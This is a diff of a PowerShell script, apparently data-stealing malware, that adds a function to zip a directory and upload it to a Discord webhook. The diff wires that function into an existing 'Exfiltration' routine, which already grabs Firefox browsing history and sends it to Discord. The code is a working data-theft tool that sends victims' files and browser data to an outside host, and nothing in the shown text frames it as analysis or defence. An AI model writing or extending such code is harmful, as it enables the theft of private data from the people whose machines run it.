@@ -47,6 +47,35 @@ function Upload-Discord {
 }
 
 
+# Function to create a zip archive and upload to Discord
+function ZipAndUploadToDiscord {
+    param (
+        [string]$sourcePath,
+        [string]$zipFilePath,
+        [string]$discordUrl,
+        [string]$discordMessage
+    )
+
+    # Function to create a zip archive
+    function Create-ZipArchive {
+        param (
+            [string]$ZipSourcePath,
+            [string]$zipFilePath
+        )
+
+        Add-Type -AssemblyName System.IO.Compression.FileSystem
+        [System.IO.Compression.ZipFile]::CreateFromDirectory($ZipSourcePath, $zipFilePath)
+    }
+
+    # Call Create-ZipArchive to create the zip archive
+    Create-ZipArchive -ZipSourcePath $sourcePath -zipFilePath $zipFilePath
+
+    # Call Upload-Discord to send the zip archive to Discord
+    Upload-Discord -file $zipFilePath -text $discordMessage -discordUrl $discordUrl
+}
+
+
+
 # Créer un scriptblock pour la fonction Exfiltration
 function Exfiltration {
     # Get desktop path
@@ -77,7 +106,8 @@ function Exfiltration {
     GrabBrowserData -Browser "firefox" -DataType "history" | Out-File -Append -FilePath "BrowserData.txt"
     Upload-Discord -file "BrowserData.txt" -text "Browser Data:"
 
-
+    # Call the ZipAndUploadToDiscord
+    ZipAndUploadToDiscord -sourcePath $sourcePath -zipFilePath $zipFilePath -discordUrl $discordUrl -discordMessage $discordMessage
     
 }
 
